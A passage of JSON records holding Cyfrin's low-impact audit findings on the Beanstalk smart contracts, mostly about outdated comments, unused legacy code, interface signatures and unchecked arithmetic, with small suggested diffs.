      "content": "`Weather::handleRain` contains a [condition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L239-L241) related to the legacy withdrawal queue that should be modified to reflect the updated logic. It is understood this has since been modified in a more recent commit.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31239",
      "title": "`IBeanstalk` interface should be updated to reference Stem-based deposits",
      "impact": "LOW",
      "content": "The [`IBeanstalk`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/interfaces/IBeanstalk.sol#L26) interface currently references the old interface for a number of functions and should be updated:\n\n```diff\n    function transferDeposits(\n        address sender,\n        address recipient,\n        address token,\n-        uint32[] calldata seasons,\n+        int96[] calldata stems,\n        uint256[] calldata amounts\n    ) external payable returns (uint256[] memory bdvs);\n\n    ...\n\n    function convert(\n        bytes calldata convertData,\n-        uint32[] memory crates,\n+        int96[] memory stems,\n        uint256[] memory amounts\n    ) external payable returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);\n\n    function getDeposit(\n        address account,\n        address token,\n-        uint32 season\n+        int96 stem\n    ) external view returns (uint256, uint256);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31238",
      "title": "Remove unused/unnecessary constants in `LibIncentive`",
      "impact": "LOW",
      "content": "`LibIncentive` currently defines a [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L23-L24) constant for the Uniswap Oracle lookback window, which is both unused and incorrect – this should be removed. This library also defines [`BASE_FEE_CONTRACT`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L45-L46), which shadows a constant of the same name and value in `C.sol` – this can also be removed in favor of the [definition](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L75-L76) in `C.sol`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31237",
      "title": "Legacy code in `LibPRBMath` should be removed",
      "impact": "LOW",
      "content": "The commented versions of the [`SCALE_LPOTD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L24) and [`SCALE_INVERSE`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L28) constants in `LibPRBMath` are taken from the original [PRBMath library](https://github.com/PaulRBerg/prb-math/blob/e33a042e4d1673fe9b333830b75c4765ccf3f5f2/contracts/PRBMath.sol#L113-L118) and are intended to work with unsigned 60.18-decimal fixed-point numbers. It is understood that the values of the [uncommented versions](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L37-L42) of these constants were derived by the original author for modifications required by Beanstalk. These modifications are no longer used, and so, along with [`LibPRBMath::powu`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L44-L57), [`LibPRBMath::logBase2`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L33-L66) and [`LibPRBMath::mulDivFixedPoint`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L59C14-L96) should be removed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31236",
      "title": "Miscellaneous informational findings regarding Curve-related contracts/libraries",
      "impact": "LOW",
      "content": "It is understood that a significant portion of logic related to Curve contracts has been copied from existing implementations, written in Vyper, and ported to Solidity for the purpose of use both within Beanstalk and as an on-chain reference for wider Beanstalk ecosystem contracts. The most pressing issue identified here pertains to the use of unchecked arithmetic. Unlike the Solidity compiler version 0.7.6 utilized by the Beanstalk contracts, the Vyper compiler, utilized by Curve contracts, handles integer overflow checks by default and will revert if one is detected. In other contracts where this functionality is desired, Beanstalk uses the OpenZeppelin SafeMath library; however, this is not the case at all in [`LibCurve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L13), [`CurvePrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L17) and [`BeanstalkPrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/BeanstalkPrice.sol#L7). While we have been unable to identify any specific vulnerabilities (due to the time-constrained nature of this engagement) that may arise as a result, it is recommended to implement these contracts as closely to the existing Vyper implementations as possible, using SafeMath functions rather than unchecked arithmetic operators. `LibBeanMetaCurve` does import the SafeMath library but still contains some [instances](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L40) of [unchecked arithmetic](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L58) – if this is intentional, then it should at least be commented as explaining why it is safe to do so; otherwise, the recommendation applies here also.\n\nThe following additional informational findings were identified:\n* `CurvePrice::getCurveDeltaB` and `LibBeanMetaCurve::getDeltaBWithD` both contain [unsafe](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L56) [casts](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L59) from `uint256` to `int256`. While it is unlikely that these will ever cause an issue since the number of beans at peg and the corresponding equilibrium pool BEAN balance are both highly unlikely to exceed the max `int256` value, it is recommended that this be resolved along with the recommendation regarding the use of unchecked arithmetic.\n* [Multiplication by one](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L43) is unnecessary and redundant when calculating the price based on normalized reserves and rates, given that it adds no additional precision and that of the BEAN rate is already sufficient at 30 decimals.\n* The [implementation referenced](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L88) in `LibCurve::getD` uses `255` as the upper bound for the number of Newton-Raphson approximation iterations rather than `256`, as is the case [here](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L98). In reality, the approximation should converge long before nearing either of these values, so any additional gas usage is unlikely.\n* In the event `LibCurve::getD` fails to converge, this function [will revert](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L110); therefore, the unreachable line of code which [returns zero](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L111) does not appear to be necessary.\n* The NatSpec of `LibCurve::getXP` contains a small [mistake](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L151):\n```diff\n    /**\n     * @dev Return the `xp` array for two tokens. Adjusts `balances[0]` by `padding`\n     * and `balances[1]` by `rate / PRECISION`.\n     *\n-    * This is provided as a gas optimization when `rates[0] * PRECISION` has been\n+    * This is provided as a gas optimization when `rates[0] / PRECISION` has been\n     * pre-computed.\n     */\n```\n* The `xp1` variable in [`LibCurveConvert::beansToPeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibCurveConvert.sol#L24-L35) should be renamed `xp0` to be semantically correct.\n* `CurveFacet::is3Pool` should be formatted with the same indentation as other functions – consider running a formatting tool such as `forge fmt`.\n* The existing [`token`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244) declaration within `CurveFacet::removeLiquidityImbalance` can be reused when entering the conditional 3Pool/Tri-Crypto block rather than also declaring [`lpToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244) which will be assigned the same value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31235",
      "title": "Ambiguous comment in `LibEthUsdOracle::getPercentDifference` NatSpec",
      "impact": "LOW",
      "content": "The following comment in the NatSpec of [`LibEthUsdOracle::getPercentDifference`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibEthUsdOracle.sol#L80-L83) is ambiguous:\n> *Gets the percent difference between two values with 18 decimal precision.*\n\nThis function returns a percentage difference with 18 decimal precision but does not necessarily require that the values it takes as argument should be of 18 decimal precision; they should, however, both be of the same precision, which in this case is 6 decimals. It is recommended to reword the comment to make clearer these intentions and behaviours.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31234",
      "title": "`LibUniswapOracle::PERIOD` comment should be resolved",
      "impact": "LOW",
      "content": "There is a [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L21) in `LibUniswapOracle` that suggests the [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L22) constant may be incorrect. It is understood that this value is actually already correct, so the todo comment should be resolved and all references to a 30-minute lookback period in the Beanstalk whitepaper should be updated.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31233",
      "title": "Unused legacy function `LibTokenSilo::calculateStalkFromStemAndBdv` can be removed",
      "impact": "LOW",
      "content": "As [stated](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L205-L207) in `ConvertFacet::_depositTokensForConvert`, the legacy function [`LibTokenSilo::calculateStalkFromStemAndBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L416-L428) is no longer used and so can be removed. If it is desired to keep this function visible for reference, then it is recommended to comment it out.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31232",
      "title": "Inaccurate comment in `LibTokenSilo::removeDepositFromAccount` NatSpec should be updated",
      "impact": "LOW",
      "content": "Legacy Silo v2 Deposits are stored in a [legacy mapping](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L149), now deprecated but maintained as legacy deposits that have not been migrated remain stored here. [This line](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L218) in the `LibTokenSilo::removeDepositFromAccount` NatSpec appears to refer to the legacy deposits mapping and should be updated to the new [Silo v3 deposits](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L156) stored as a mapping `uint256` to `Deposit`. If this comment already intends to refer to the new deposits mapping, it should be made clear that `[token][stem]` is meant to indicate the concatenation of the token address and stem value to get the deposit identifier used as a key to the mapping.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31231",
      "title": "`Sun::setSoilAbovePeg` considers intervals for `caseId` larger than intended",
      "impact": "LOW",
      "content": "As is [commented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L219) in the NatSpec of [`Sun::setSoilAbovePeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L226-L234), Beanstalk wants to gauge demand for Soil _when above peg_. As such, based on the implementation of [`InitBip13`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBip13.sol#L18-L30), the following modifications should be made:\n\n```diff\n-   if (caseId >= 24) {\n+   if (caseId >= 28) {\n         newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate\n-   } else if (caseId < 8) {\n+   } else if (4 <= caseId < 8) {\n         newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate\n    }\n```\n\nThis does not affect the Soil mechanism because the `caseId` [passed](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L58) to [`Sun::stepSun`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L66-L83) when called in [`SeasonFacet::gm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L47-L62) has already been correctly calculated from within [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L100-L172); however, it is recommended to modify the logic so that its implementation strictly conforms to its intention.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31230",
      "title": "Incorrect comment in `Oracle::totalDeltaB` NatSpec",
      "impact": "LOW",
      "content": "Currently, `Oracle::totalDeltaB` [states](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L23) that this function returns the current shortage/excess of Beans (`deltaB`) in the BEAN/3CRV Curve liquidity pool; however, it [actually returns the sum](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L26-L28) of `deltaB` across both the Curve pool and BEAN/ETH Well and so the comment should be updated to reflect this.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31229",
      "title": "Miscellaneous comments on `TokenSilo` NatSpec and legacy references",
      "impact": "LOW",
      "content": "Beanstalk previously implemented a withdrawal queue that was later replaced by a per-Season vesting period. The `TokenSilo` contract NatSpec currently still [references](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L20-L21) this legacy withdrawal system but should be updated to reflect the current implementation pertaining to the removal of Stem-based deposits.\n\nAdditionally, references to \"Crates\" and [`crateBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L348) should be removed and updated to `bdvRemoved` respectively. The [NatSpec of `TokenSilo::tokenSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L430-L446) is missing references to [`milestoneStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L403-L406) and [`encodeType`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L408-L411) which are also present in the `SiloSettings` storage struct. Consider reordering this comment to accurately reflect the order of elements in the [declaration](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) within `AppStorage.sol`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31228",
      "title": "Shadowing of `AppStorage` storage pointer variable `s` in Facets which inherit `ReentrancyGuard`",
      "impact": "LOW",
      "content": "The `AppStorage` storage pointer variable `s` is [defined in `ReentrancyGuard`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/ReentrancyGuard.sol#L17) as the sole variable in its first storage slot. Both [`MigrationFacet::getDepositLegacy`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/MigrationFacet.sol#L95) and [`LegacyClaimWithdrawalFacet::getWithdrawal`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/LegacyClaimWithdrawalFacet.sol#L71) shadow this existing declaration within the body of functions relating to legacy deposits/withdrawals. While this does not pose a security risk, it is recommended to remove the shadowed declarations, instead using the storage pointer defined in the inherited contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31227",
      "title": "Inaccurate comment in `TokenFacet::approveToken` NatSpec",
      "impact": "LOW",
      "content": "The `TokenFacet::approveToken` NatSpec currently [states](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L102) that this function approves a token for both internal and external token balances; however, this is not correct as the [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L109) to [`LibTokenApprove::approve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L21-L30) does not approve for external balances, only internal balances that are only ever spent by [calling](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L94) [`LibTokenApprove.spendAllowance`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L40-L55) in [`TokenFacet::transferInternalTokenFrom`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L77).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31226",
      "title": "`LibSilo::_removeDepositsFromAccount` events may be emitted with additional `amounts` elements when called from `EnrootFacet::enrootDeposits` with `amounts.length > stems.length`",
      "impact": "LOW",
      "content": "For the purpose of gas efficiency, `EnrootFacet::enrootDeposits` does not validate that its `stems` and `amounts` array arguments are of the same length. [Looping](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L138) over the `stems` array, any additional `amounts` elements would remain unused and in the case of `amounts.length < stems.length` this would result in an index out-of-bounds error. The same is true of the [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L64-L69) to [`LibSilo::_removeDepositsFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L577) which makes use of these arguments; however, in the case where `amounts` contains additional elements then these will be emitted [`LibSilo::TransferBatch`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L616) and [`LibSilo::RemoveDeposits`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L617) events which may be undesirable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31225",
      "title": "Double assignment in `InitDiamond` should be removed to avoid confusion",
      "impact": "LOW",
      "content": "When initializing the \"Weather\" cases in `InitDiamond` there is a double assignment which should be removed to avoid confusion:\n\n```diff\n- s.cases = s.cases = [\n+ s.cases = [\n        // Dsc, Sdy, Inc, nul\n       int8(3),   1,   0,   0,  // Exs Low: P < 1\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31224",
      "title": "Incorrect comment in `InitBipNewSilo`",
      "impact": "LOW",
      "content": "`InitBipNewSilo` contains the [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L69):\n\n> *emit event for unripe LP/Beans from 4 to 1 grown stalk per bdv per season*\n\nHowever, this comment is incorrect as the [constants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L27-L28) used in the subsequent [event emissions](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L70-L71) are 0, as intended.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31223",
      "title": "`InitBip9` incorrectly references BIP-8 in the contract NatSpec",
      "impact": "LOW",
      "content": "The contract NatSpec for `InitBip9` currently incorrectly references BIP-8. This should be updated to avoid confusion:\n\n```diff\n    /**\n     * @author Publius\n-    * @title InitBip8 runs the code for BIP-8.\n+    * @title InitBip9 runs the code for BIP-9.\n    **/\n\ncontract InitBip9 {\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31222",
      "title": "Incorrect comment in `FieldFacet::_sow` NatSpec",
      "impact": "LOW",
